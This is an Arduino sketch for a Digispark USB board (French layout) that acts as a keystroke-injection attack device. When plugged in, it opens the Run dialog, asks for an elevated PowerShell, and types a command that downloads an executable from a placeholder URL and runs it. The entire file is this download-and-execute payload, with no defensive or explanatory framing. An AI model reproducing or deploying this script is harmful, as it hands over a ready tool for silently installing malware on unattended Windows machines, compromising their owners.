#include "DigiKeyboardFr.h"



void loop() {}

void setup() {
  DigiKeyboardFr.sendKeyStroke(0);
  DigiKeyboardFr.delay(1000);
  // start of script
  // undefined
  // let the HID enumerate
  DigiKeyboardFr.delay(2000);
  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardFr.delay(200);
  // my best attempt at a elevated powershell instance
  DigiKeyboardFr.print(F("powershell Start-Process powershell -Verb runAs"));
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(3000);
  DigiKeyboardFr.print(F("$down = New-Object System.Net.Webclient; $url = 'http://link/nameofpayload.exe'; $file = 'nameofpayload.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;"));
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
}
